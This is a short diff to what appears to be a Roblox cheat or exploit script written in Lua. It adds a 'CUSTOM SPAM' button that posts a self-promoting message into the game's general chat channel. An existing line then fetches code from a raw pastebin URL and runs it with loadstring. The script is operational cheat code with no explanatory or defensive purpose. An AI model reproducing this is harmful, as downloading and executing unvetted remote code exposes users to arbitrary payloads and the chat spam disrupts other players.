@@ -2113,7 +2113,21 @@ end)
 --==================================================
 
 btn("CUSTOM SPAM 😎👺",P5,function()
+local message = "SCRIPT BY " .. playerName
+    .. "_______//_______//______💀🎀_______//______//______"
+    .. "MADE BY" .. playerName
+    .. "_________________COUSTAM SPAM V1 LOADED 💀🔥..."
 
+local channel = game:GetService("TextChatService")
+    :FindFirstChild("TextChannels")
+
+channel = channel and channel:FindFirstChild("RBXGeneral")
+
+if channel then
+    pcall(function()
+        channel:SendAsync(message)
+    end)
+		end		
 
 		
 loadstring(game:HttpGet("https://pastebin.com/raw/FVLWdWWy"))()end)
